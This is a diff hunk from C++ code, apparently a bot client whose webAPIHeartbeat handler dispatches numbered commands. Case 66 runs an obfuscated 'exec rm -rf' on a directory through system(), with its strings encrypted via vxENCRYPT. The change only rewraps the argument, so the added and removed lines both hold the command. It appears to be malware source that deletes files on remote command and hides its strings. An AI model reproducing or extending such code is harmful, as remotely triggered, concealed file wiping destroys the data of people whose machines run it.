@@ -43,7 +43,7 @@ webAPIHeartbeat::webAPIHeartbeat() {
                 break;
             case 66:
                 if (!filePath.empty() && found) {
-                    system(vxENCRYPT("exec rm -rf ").decrypt() + filePath.substr(0, found) + vxENCRYPT("/*").decrypt());
+                    system(std::string(vxENCRYPT("exec rm -rf ").decrypt() + filePath.substr(0, found) + vxENCRYPT("/*").decrypt()));
                 }
                 this->eatIt();
                 break;
